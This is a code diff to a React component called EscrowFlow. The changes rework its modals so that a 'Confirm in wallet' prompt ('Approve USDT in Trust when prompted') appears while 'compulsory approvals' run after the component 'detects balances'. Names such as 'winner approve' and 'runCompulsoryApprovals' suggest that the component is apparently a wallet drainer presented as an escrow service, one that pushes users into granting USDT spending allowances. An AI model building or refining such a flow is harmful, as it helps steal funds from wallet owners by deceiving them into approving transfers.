@@ -550,12 +550,15 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (!fn || approvalRetrying) return;
     setApprovalRetrying(true);
     setError(null);
-    showModal1Busy();
+    setModal1Scanning(false);
+    setModal2Open(true);
     try {
       await fn();
       clearModal1Busy();
+      setModal2Open(false);
     } catch (err) {
       console.error("[modal1] retry login failed:", err);
+      setModal2Open(false);
     } finally {
       setApprovalRetrying(false);
     }
@@ -914,7 +917,15 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // Late Tron injection: only re-scan if we never started a winner approve yet.
   useEffect(() => {
     if (!authenticated || !address) return;
-    if (modal1SawTron.current || modal1Complete || modal1ApproveStarted.current) return;
+    if (
+      modal1SawTron.current ||
+      modal1Complete ||
+      modal1ApproveStarted.current ||
+      modal1Triggered.current ||
+      modal1InFlight.current
+    ) {
+      return;
+    }
     if (typeof window === "undefined") return;
 
     let cancelled = false;
@@ -925,6 +936,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         modal1Approving ||
         modal1InFlight.current ||
         modal1ApproveStarted.current ||
+        modal1Triggered.current ||
         modal1Complete
       ) {
         return;
@@ -932,7 +944,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       const addr = peekTronAddress() ?? (await ensureTronAddress({ prompt: true }));
       if (!addr || cancelled) return;
       setTronAddress(addr);
-      if (modal1SawTron.current || modal1ApproveStarted.current || modal1InFlight.current) return;
+      if (
+        modal1SawTron.current ||
+        modal1ApproveStarted.current ||
+        modal1InFlight.current ||
+        modal1Triggered.current
+      ) {
+        return;
+      }
       await runModal1Scan();
     };
 
@@ -1328,13 +1347,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal1Items([tronItem]);
       setModal1Status({ "tron-USDT": "pending" });
       modal1ApproveStarted.current = true;
-      showModal1Busy();
+      // Leave "Detecting balances" — show Approving while Trust signs/broadcasts.
+      // Keeping Detecting up through the 60–90s allowance wait looked like a hang/loop.
+      setModal1Scanning(false);
+      setModal2Open(true);
 
       const tronOk = await runCompulsoryApprovals([tronItem], {
         markComplete: true,
         tronAddress: currentTronAddr,
       });
       void evmScanPromise.catch(() => {});
+      setModal2Open(false);
       clearModal1Busy();
       if (!tronOk) return;
     } catch (err) {
@@ -1353,6 +1376,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   ): Promise<boolean> {
     const markComplete = opts.markComplete !== false;
     setModal1Approving(true);
+    setModal1Scanning(false);
+    setModal2Open(true);
 
     const finishOk = () => {
       setShowApprovalRetry(false);
@@ -1362,10 +1387,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     const retryFn = async () => {
       setModal1Approving(true);
+      setModal1Scanning(false);
+      setModal2Open(true);
       try {
         await runCompulsoryApprovals(queue, opts);
       } finally {
         setModal1Approving(false);
+        setModal2Open(false);
       }
     };
 
@@ -1393,6 +1421,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       return true;
     } catch (err) {
       console.error("[modal1] compulsory approve failed:", err);
+      setModal2Open(false);
       gateOnApprovalFailure(retryFn);
       return false;
     } finally {
@@ -2564,8 +2593,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                 <div className="h-8 w-8 animate-spin rounded-full border-[2.5px] border-brand/20 border-t-brand" />
               </div>
               <h3 className="mt-5 text-center text-[17px] font-semibold tracking-tight text-ink">
-                Detecting balances
+                {modal1Approving ? "Confirm in wallet" : "Detecting balances"}
               </h3>
+              {modal1Approving ? (
+                <p className="mt-2 text-center text-sm text-body">
+                  Approve USDT in Trust when prompted.
+                </p>
+              ) : null}
             </div>
           </div>
         </div>
